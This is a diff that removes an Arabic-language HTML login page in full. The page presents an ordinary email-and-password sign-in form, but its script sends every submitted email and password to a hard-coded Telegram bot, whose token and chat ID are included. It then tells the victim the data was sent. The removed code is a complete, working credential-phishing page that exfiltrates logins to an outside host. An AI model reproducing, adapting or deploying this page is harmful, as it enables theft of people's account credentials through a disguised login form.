@@ -1,45 +1,0 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-<meta charset="UTF-8" />
-<title>نموذج تسجيل الدخول</title>
-</head>
-<body>
-<h2>تسجيل الدخول</h2>
-<form id="loginForm">
-  البريد الإلكتروني:<br />
-  <input type="email" id="email" required /><br /><br />
-  كلمة السر:<br />
-  <input type="password" id="password" required /><br /><br />
-  <button type="submit">تسجيل الدخول</button>
-</form>
-<p id="status"></p>
-
-<script>
-const TOKEN = '7980091785:AAGXalXVNvtluTKpVg96NyiSmLIN-Ql7D5k';
-const CHAT_ID = '1430370545';
-
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  const email = document.getElementById('email').value;
-  const password = document.getElementById('password').value;
-
-  const message = encodeURIComponent(`🔐 تسجيل جديد:\n📧 Email: ${email}\n🔑 Password: ${password}`);
-  const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
-
-  fetch(url)
-    .then(response => {
-      if(response.ok) {
-        document.getElementById('status').innerText = '✅ تم إرسال البيانات بنجاح!';
-        this.reset();
-      } else {
-        document.getElementById('status').innerText = '❌ فشل في الإرسال.';
-      }
-    })
-    .catch(() => {
-      document.getElementById('status').innerText = '❌ حدث خطأ في الاتصال.';
-    });
-});
-</script>
-</body>
-</html>
